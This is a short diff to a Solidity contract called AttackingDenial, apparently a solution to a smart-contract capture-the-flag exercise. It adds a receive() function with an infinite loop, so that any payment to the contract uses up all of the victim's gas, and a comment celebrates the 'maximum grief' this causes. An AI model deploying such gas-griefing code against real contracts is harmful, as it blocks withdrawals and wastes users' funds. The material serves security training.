@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+       // I could technically just do require(false), but if my
+       // objective is to cause maximum grief, I think making the
+       // victim spend all potential gas is more evil 😈
+       while(true) {}
+    }
 }
